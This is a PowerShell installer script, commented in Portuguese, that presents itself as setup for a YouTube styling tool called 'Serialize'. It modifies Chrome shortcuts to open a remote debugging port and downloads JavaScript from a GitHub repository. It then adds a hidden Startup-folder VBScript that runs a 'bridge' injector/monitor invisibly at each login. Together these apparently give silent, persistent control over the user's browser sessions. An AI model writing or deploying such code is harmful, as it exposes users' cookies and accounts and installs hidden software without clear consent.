# Serialize Installer - Version 0.3
$installPath = "$env:APPDATA\Serialize"
if (!(Test-Path $installPath)) { New-Item -Path $installPath -ItemType Directory }

Write-Host "--- Iniciando Instalação do Serialize ---" -ForegroundColor Cyan

# 0. Garante que o Chrome está fechado (Necessário para a Flag ativar)
Write-Host "Certifique-se de fechar o Chrome para que as alterações surtam efeito." -ForegroundColor Yellow

# 1. Função para injetar flag em atalhos (.lnk)
function Inject-Serialize-Flag {
    param([string]$folderPath)
    if (Test-Path $folderPath) {
        $shell = New-Object -ComObject WScript.Shell
        $shortcuts = Get-ChildItem -Path $folderPath -Filter "*Chrome*.lnk"
        
        foreach ($lnk in $shortcuts) {
            $shortcut = $shell.CreateShortcut($lnk.FullName)
            if ($shortcut.TargetPath -like "*chrome.exe*") {
                $shortcut.Arguments = "--remote-debugging-port=9222"
                $shortcut.Save()
                Write-Host "Flag injetada em: $($lnk.Name)" -ForegroundColor Green
            }
        }
    }
}

# 2. Varre Desktop e Barra de Tarefas
$desktop = [System.Environment]::GetFolderPath('Desktop')
$taskbar = "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"

Inject-Serialize-Flag $desktop
Inject-Serialize-Flag $taskbar

# 3. Baixa os componentes do repositório
Write-Host "Baixando componentes do Serialize..." -ForegroundColor Yellow
$baseUrl = "https://raw.githubusercontent.com/denishark333/serialize1.0/main"

# Download do Core (CSS/JS do YouTube)
Invoke-WebRequest -Uri "$baseUrl/core.js" -OutFile "$installPath\core.js"

# Download do Bridge (O Injetor/Monitor)
Invoke-WebRequest -Uri "$baseUrl/bridge.js" -OutFile "$installPath\bridge.js"

# 4. Criar o VBScript para rodar o Bridge de forma invisível
Write-Host "Configurando inicialização silenciosa..." -ForegroundColor Yellow
$vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SerializeBridge.vbs"
$vbsContent = @"
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run "node.exe $installPath\bridge.js", 0
Set WinScriptHost = Nothing
"@
$vbsContent | Out-File $vbsPath -Encoding ASCII

Write-Host "--- Serialize instalado com sucesso! ---" -ForegroundColor Cyan
Write-Host "1. Reinicie o Chrome pelos atalhos modificados."
Write-Host "2. O motor de injeção iniciará automaticamente com o Windows."
